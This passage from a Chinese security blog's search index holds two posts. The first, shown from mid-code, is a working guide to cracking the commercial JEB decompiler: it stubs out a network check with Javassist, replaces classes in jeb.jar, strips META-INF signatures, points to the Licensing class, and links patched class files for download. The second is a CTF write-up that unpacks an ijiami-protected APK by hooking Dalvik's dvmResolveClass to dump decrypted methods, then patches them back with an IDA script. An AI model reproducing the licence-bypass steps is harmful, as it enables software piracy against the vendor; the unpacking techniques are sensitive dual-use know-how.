old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;httpPost&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(String.class.getName()),</div><div class="line">                                        pool.get(String.class.getName()),</div><div class="line">                                        pool.get(long[].class.getName())</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return null;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>运行后会在工程目录生成一个文件夹，以你修改的类名为目录结构。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508823032290g5jxwh19.png?imageslim" alt="paste image"></p>
<p>把这些 class文件替换到来的 jar 包里面就可了。<br>可以使用 winrar 把 jar 包打开，找到对应目录，拖进去替换就行了。<br>替换之后要去 META-INF 删掉一些东西。具体看下图</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508823340258i9tfkhxn.png?imageslim" alt="paste image"></p>
<p>这样就完成了jar包的修改。<br>最后说下静态分析jar包的工具，使用 JEB 就可以。首先把jar 转换为 dex.</p>
<hr>
<p>dx.bat –dex –output=d:\dst.dex src.jar</p>
<hr>
<p>然后拿起jeb分析就行了。</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>如果你看到了这里，并且按我前面所说的方式一步一步破解了jeb, 那么恭喜你和我一样被坑了。弄得差不多的时候，我发现有一个神奇的类。<br><code>com.pnfsoftware.jeb.client.Licensing</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508823755460wqmsw9br.png?imageslim" alt="paste image"></p>
<p>瞬间爆炸，我们只要修改这里的函数的返回值，或者直接重写这个类，就可以基本搞定这款软件了。52破解上的  jeb 2.2.7 中延长使用时间 就是修改的这个类的方法（后面才看的，悲伤~~）</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508823969930hxe2xs6n.png?imageslim" alt="paste image"></p>
<p>编译后 <a href="https://gitee.com/hac425/blog_data/blob/master/jeb_data.zip" target="_blank" rel="external">Class文件，点我</a> ，用它去替换jeb.jar中的相应文件即可,具体替换方法，文中有介绍。</p>
<p>分析过程的一些笔记<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">2.3.3</div><div class="line">com.pnfsoftware.jebglobal.cF  用于获取serial, uuid 生成字符串</div><div class="line">  .At---&gt; get uuid  </div><div class="line">  .GQ----&gt; get serial number   </div><div class="line">  .dL------&gt;     get_md5、</div><div class="line">com.pnfsoftware.jebglobal.eI  sC方法会检测运行时间，定时退出  校验运行时间  patch</div><div class="line">com.pnfsoftware.jeb.client.Licensing    licensing 校验   ， 修改该类的方法的返回值可以拿到大量的结果</div><div class="line">com.pnfsoftware.jebglobal.Wr                        重要函数，程序初始化， 保存功能</div></pre></td></tr></table></figure></p>
<p>分析过程中的另外的 Btrace脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">/* BTrace Script Template */  </div><div class="line">import com.sun.btrace.annotations.*;  </div><div class="line">import static com.sun.btrace.BTraceUtils.*;  </div><div class="line">/*  </div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">@BTrace  </div><div class="line">public class TracingScript &#123;  </div><div class="line"></div><div class="line">  @OnMethod(  </div><div class="line">    clazz = &quot;com.pnfsoftware.jebglobal.Wr&quot;, </div><div class="line">    method = &quot;saveProject&quot;)  </div><div class="line">   public static void traceExecute()&#123;  </div><div class="line">      jstack();  </div><div class="line">      println(strcat(&quot;--------------:--\n&quot;,&quot;********************\n&quot;));  </div><div class="line">   &#125;  </div><div class="line">  </div><div class="line">&#125;  </div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">@BTrace  </div><div class="line">public class TracingScript &#123;  </div><div class="line"></div><div class="line">  @OnMethod(  </div><div class="line">    clazz = &quot;com.pnfsoftware.jebglobal.qI&quot;, </div><div class="line">    method = &quot;getKey&quot;,</div><div class="line">    location=@Location(Kind.RETURN)  </div><div class="line">  )  </div><div class="line">   public static void traceExecute(@Self com.pnfsoftware.jebglobal.qI object, @Return String result)&#123;  </div><div class="line">      println(strcat(&quot;ret: &quot;,str(result)));  </div><div class="line">      jstack();  </div><div class="line">      println(strcat(&quot;--------------:--\n&quot;,&quot;********************\n&quot;));  </div><div class="line">   &#125;  </div><div class="line">  </div><div class="line">&#125;  </div><div class="line"></div><div class="line">*/</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">@BTrace  </div><div class="line">public class TracingScript &#123;  </div><div class="line"></div><div class="line">  @OnMethod(  </div><div class="line">    clazz = &quot;com.pnfsoftware.jebglobal.GN&quot;, </div><div class="line">    method = &quot;dL&quot;,</div><div class="line">    location=@Location(Kind.RETURN)  </div><div class="line">  )  </div><div class="line">   public static void traceExecute(@Self com.pnfsoftware.jebglobal.GN object, byte[] var0, int var1, int var2, @Return String result)&#123;  </div><div class="line">      println(strcat(&quot;ret: &quot;,str(result)));  </div><div class="line">      jstack();  </div><div class="line">      println(strcat(&quot;--------------:--\n&quot;,&quot;********************\n&quot;));  </div><div class="line">   &#125;  </div><div class="line">  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> jeb破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jeb </tag>
            
            <tag> 破解 </tag>
            
            <tag> jar包调试 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[【天翼杯安卓题二】 爱加密脱壳实战]]></title>
      <url>//%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/2017-10-22-aijiami-unpacker.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  这个apk使用爱加密加密，加密时间是2017.6月。这个题其实就是个脱壳题，脱完立马见flag。(出题人也太懒了)</p>
<p>题目链接：<a href="https://gitee.com/hac425/blog_data/blob/master/app02.apk" target="_blank" rel="external">https://gitee.com/hac425/blog_data/blob/master/app02.apk</a></p>
<h3 id="壳介绍"><a href="#壳介绍" class="headerlink" title="壳介绍"></a>壳介绍</h3><p>爱加密的壳16年年底就已经开始通过 <code>hook dvmResolveClass</code> ，在调用具体方法时解密方法指令，然后将 DexFile结构体中的对应方法的 <code>md-&gt;insns</code> 指向 解密后的方法指令数据区，然后进入 <code>真正的dvmResolveClass</code>中执行指令，执行完后在重新加密指令，这样就可以防止 <code>dexhunter</code> 等工具在内存中 <code>dump dex</code> 文件。</p>
<p>流程图</p>
<p><img src="/img/android_sec/ijiami_flow.png" alt="流程图"></p>
<p><a href="http://www.cnblogs.com/2014asm/p/6534189.html" target="_blank" rel="external">图片来源</a> </p>
<h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><p>由上面可以知道，在<code>dvmResolveClass</code>函数执行的时候，代码是已经还原好了的。这时我们去<code>dump</code>相应的指令就是正确的指令。于是修改 <code>dvmResolveClass</code> 的代码，<code>dump</code> 方法的数据。<br>修改 <code>dvmResolveClass</code> 函数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">/*  add dump .....*/   </div><div class="line">    </div><div class="line">  char key_str[20] = &quot;jiajiatest&quot;;</div><div class="line">  int fd=open(&quot;/data/local/tmp/resolve_class_config&quot;,O_RDONLY,0666);</div><div class="line">  if(fd!=-1)&#123;</div><div class="line">    int len = read(fd,key_str,19);</div><div class="line">    key_str[len-1] = &apos;\x00&apos;;</div><div class="line">    key_str[len] = &apos;\x00&apos;;</div><div class="line">    close(fd);</div><div class="line">  &#125;</div><div class="line">  ALOGI(&quot;The key_str ---&gt; %s----referrer-&gt;descriptor---&gt;%s--&quot;, key_str, referrer-&gt;descriptor);</div><div class="line">  </div><div class="line">if(strstr(referrer-&gt;descriptor, key_str))&#123;</div><div class="line">       char task_name[] = &quot;task_name&quot;;</div><div class="line">      char *logbuf = new char[1024];</div><div class="line">      char path[50] = &#123;0&#125;;</div><div class="line">      sprintf(path, &quot;/data/local/tmp/%s_dump_%d&quot;, key_str, getpid());</div><div class="line">      FILE *fpw = fopen(path, &quot;awb+&quot;);</div><div class="line">      for(int i=0; i &lt; referrer-&gt;directMethodCount; i++)&#123;</div><div class="line">        Method* md = &amp;referrer-&gt;directMethods[i];</div><div class="line">        const char* mName_d = md-&gt;name;</div><div class="line">        const u2 insSize_d = md-&gt;insSize;</div><div class="line">        const u2* insns_d = md-&gt;insns;</div><div class="line">        const u2 methodldx_d = md-&gt;methodIndex;</div><div class="line">        u4 insns_d_size = dvmGetMethodInsnsSize(md);</div><div class="line">// ALOGI(&quot;hacklh_md----&gt;%p, i--&gt;%d, directMethodCount--&gt;%d&quot;, md, i,referrer-&gt;directMethodCount);</div><div class="line">        sprintf(logbuf,&quot;-------------- (KL)resolving [class=%s, method=%s, methodIndex=%u, insSize=%u, insns_d=%x, codeSize=%d] in pid: %d(name: %s)&quot;,referrer-&gt;descriptor,mName_d,methodldx_d,insSize_d,(u4)insns_d, insns_d_size,getpid() , task_name);</div><div class="line">        LOGD(&quot;%s&quot;,logbuf);</div><div class="line">        if(fpw != NULL)&#123; </div><div class="line">          fwrite(logbuf,1,strlen(logbuf),fpw);</div><div class="line">          fflush(fpw);</div><div class="line">          fwrite((u1*)insns_d,1,insns_d_size*2, fpw);</div><div class="line">          fflush(fpw);</div><div class="line">        &#125;else&#123;</div><div class="line">          LOGD(&quot;——(KL)open %s fail!&quot;, path);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      for(int i=0; i &lt; referrer-&gt;virtualMethodCount; i++)&#123;</div><div class="line">        Method* mv = &amp;referrer-&gt;virtualMethods[i];</div><div class="line">        const char* mName_v = mv-&gt;name;</div><div class="line">        const u2 insSize_v = mv-&gt;insSize;</div><div class="line">        const u2* insns_v = mv-&gt;insns;</div><div class="line">        const u2 methodIdx_v = mv-&gt;methodIndex;</div><div class="line">        u4 insns_v_size = dvmGetMethodInsnsSize(mv);</div><div class="line">        sprintf(logbuf,&quot;-------------- (KL)resolving [class=%s, method=%s, methodIndex=%u, insSize=%u, insns_d=%x, codeSize=%d] in pid: %d(name: %s)&quot;,referrer-&gt;descriptor,mName_v,methodIdx_v,insSize_v,(u4)insns_v, insns_v_size,getpid() , task_name);</div><div class="line">        LOGD(&quot;%s&quot;,logbuf);</div><div class="line">        if(fpw != NULL)&#123;</div><div class="line">          fwrite(logbuf,1,strlen(logbuf),fpw);</div><div class="line">          fflush(fpw);</div><div class="line">          fwrite((u1*)insns_v,1,insns_v_size*2, fpw);</div><div class="line">          fflush(fpw);</div><div class="line">        &#125;else&#123;</div><div class="line">          LOGD(&quot;%s&quot;,&quot;——(KL)open file fail!&quot;);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      if(fpw != NULL)&#123;</div><div class="line">        fclose(fpw);</div><div class="line">      &#125;</div><div class="line">      delete logbuf;</div><div class="line">/*  add end .....*/</div></pre></td></tr></table></figure>
<p>dump之后我们需要把指令patch到dex对应位置上去，patch的方式有很多种，我选择使用ida脚本对他进行patch。我觉得ida就是一个各种文件格式的loader，我们可以在ida中修改文件的内容，然后可以让ida把修改应用到文件中，以完成patch。 因此在IDA中patch代码十分的方便，而且也很方便的查看patch后的结果。patch代码的流程是： </p>
<hr>
<p>读取dump的方法指令—&gt;定位相应方法指令数据区在ida中的位置—-&gt;patch</p>
<hr>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div></pre></td><td class="code"><pre><div class="line">#! /usr/bin/python</div><div class="line"># -*- coding: utf8 -*-</div><div class="line"></div><div class="line"># 该脚本用于在ida中使用dump下来的method指令对 dex 进行Patch</div><div class="line">import re</div><div class="line">from dex_parser import dex</div><div class="line"></div><div class="line">#存储 存放dump数据的字典</div><div class="line">data_array = []</div><div class="line">#用来避免多次patch</div><div class="line">patched = []</div><div class="line">file_data = &quot;&quot;</div><div class="line"></div><div class="line">def parse_meta_data(data=&quot;&quot;):</div><div class="line">    # print data</div><div class="line">    ret = &#123;&#125;</div><div class="line">    tokens = re.findall(&quot;\[class=(.*?),.*?method=(.*?),.*?codeSize=(.*?)\]&quot;,data)</div><div class="line">    # print tokens</div><div class="line"></div><div class="line">    ret[&apos;class_name&apos;] = tokens[0][0][1:].replace(&apos;/&apos;,&apos;.&apos;).replace(&apos;;&apos;,&apos;&apos;)</div><div class="line">    ret[&apos;method&apos;] = tokens[0][1]</div><div class="line">    ret[&apos;code_size&apos;] = int(tokens[0][2]) * 2 #dex文件格式定义，总大小为 codeSize*2</div><div class="line">    # print ret</div><div class="line">    return ret</div><div class="line"></div><div class="line">#注释，用于给ida执行</div><div class="line"># def patch_byte(a, b):</div><div class="line">#     print hex(b),</div><div class="line"></div><div class="line">def patch(dest, src, size):</div><div class="line">    print &quot;dest::&#123;&#125;, src::&#123;&#125;, size::&#123;&#125;&quot;.format(dest, src, size)</div><div class="line">    for i in range(size):</div><div class="line">        patch_byte(dest + i, int(file_data[ src + i].encode(&apos;hex&apos;), 16))</div><div class="line"></div><div class="line">    print &quot;\n&quot;</div><div class="line"></div><div class="line">def parse_dump_data(filename):</div><div class="line">    global file_data</div><div class="line">    with open(filename, &quot;rb&quot;) as fp:</div><div class="line">        file_data = fp.read()</div><div class="line"></div><div class="line">    #使用正则表达式把说明dump数据的元数据加载到内存</div><div class="line">    all_item = re.findall(&quot;-------------- \(KL\)resolving(.*?) in pid:.*?\(name: task_name\)&quot;, file_data)</div><div class="line">    offset = 0</div><div class="line">    for meta_data in all_item:</div><div class="line">        try:</div><div class="line">            #使用字典组织数据</div><div class="line">            #&#123;&apos;class_name&apos;: &apos;com.example.jiajiatest.MainActivity&apos;, &apos;code_size&apos;: 306, &apos;method&apos;: &apos;add&apos;, &apos;data_offset&apos;: 7175&#125;</div><div class="line"></div><div class="line">            ret = parse_meta_data(meta_data)</div><div class="line">            data_addr = file_data.find(&apos;(name: task_name)&apos;, offset) + 17</div><div class="line">            ret[&apos;data_offset&apos;] = data_addr</div><div class="line">            data_array.append(ret)</div><div class="line">            offset = data_addr</div><div class="line">        except Exception as e:</div><div class="line">            raise e</div><div class="line"></div><div class="line">    return data_array</div><div class="line"></div><div class="line">def get_method_addr(method_data, signature_str):</div><div class="line">    for md_name in method_data:</div><div class="line">        if signature_str in md_name:</div><div class="line">            return method_data[md_name]</div><div class="line">    return -1</div><div class="line"></div><div class="line">def patch_dex(dump_data_file, dex_file):</div><div class="line">    dump_data = parse_dump_data(dump_data_file)</div><div class="line">    dex_obj = dex.dex_parser(dex_file)</div><div class="line">    method_data = dex_obj.get_class_data()</div><div class="line"></div><div class="line">    for item in dump_data:</div><div class="line">        signature_str = &quot;&#123;&#125;::&#123;&#125;&quot;.format(item[&apos;class_name&apos;], item[&apos;method&apos;])</div><div class="line">        if  signature_str not in patched:</div><div class="line"></div><div class="line">            #获取要patch的目标地址</div><div class="line">            addr = get_method_addr(method_data, signature_str)</div><div class="line">            if addr == -1:</div><div class="line">                print &quot;&#123;&#125; can&apos;t get insns addr&quot;.format(signature_str)</div><div class="line">                continue</div><div class="line">            #do patch</div><div class="line">            print &quot;patch &quot; + signature_str,</div><div class="line">            patch(addr,item[&apos;data_offset&apos;],item[&apos;code_size&apos;])</div><div class="line">            patched.append(signature_str)</div><div class="line"></div><div class="line">    # print patched</div><div class="line">    # for i in patched:</div><div class="line">    #     print i</div><div class="line"></div><div class="line">import pprint</div><div class="line"></div><div class="line">patch_dex(&quot;F:\code_workplace\ida_script\jiajiatest_dump_20406&quot;,&quot;F:\code_workplace\ida_script\classes.dex&quot; )</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    print &quot;comming main&quot;</div><div class="line">    # parse_dump_data(&quot;F:\code_workplace\ida_script\jiajiatest_dump_20406&quot;)</div><div class="line">    # patch_dex(&quot;F:\code_workplace\ida_script\jiajiatest_dump_20406&quot;,&quot;F:\code_workplace\ida_script\classes.dex&quot; )</div><div class="line">    # dex_obj = dex.dex_parser(&quot;F:\code_workplace\ida_script\classes.dex&quot;)</div><div class="line">    # class_data = dex_obj.get_class_data()</div><div class="line">    # pprint.pprint(class_data)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    # parse_meta_data(&quot;-------------- (KL)resolving [class=Lcom/example/jiajiatest/HttpRunner;, method=makeImgHttpGET, methodIndex=13, insSize=2, insns_d=6daf04d8, codeSize=270] in pid: 20406(name: task_name)&quot;)</div></pre></td></tr></table></figure>
<p>patch前后对比：</p>
<p>patch前</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508763745193jfvdw2et.png?imageslim" alt="raw"><br>patch后</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508763780531bdpdup3e.png?imageslim" alt="paste image"></p>
<p>这时已经可以看到程序的主体逻辑了。然后查看字符串就可以拿到flag………</p>
<h3 id="我干的傻事"><a href="#我干的傻事" class="headerlink" title="我干的傻事"></a>我干的傻事</h3><ul>
<li><p>代码循环条件忘记写了，导致越界，一打开应用就报错。 </p>
</li>
<li><p>文件打开失败，貌似是权限问题，我直接暴力把 <code>/data/local/tmp</code> 改成 777</p>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p> 分析安卓底层代码的错误，要关注 <code>logcat</code> 日志，找到出问题的代码点，然后把库的带符号版本放到ida中分析<br>分析bug, 要看代码的关键逻辑， 判断条件等。</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>要多实践，如有问题请在下面评论。</p>
]]></content>
      
        <categories>
            
            <category> 安卓安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 安卓脱壳 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
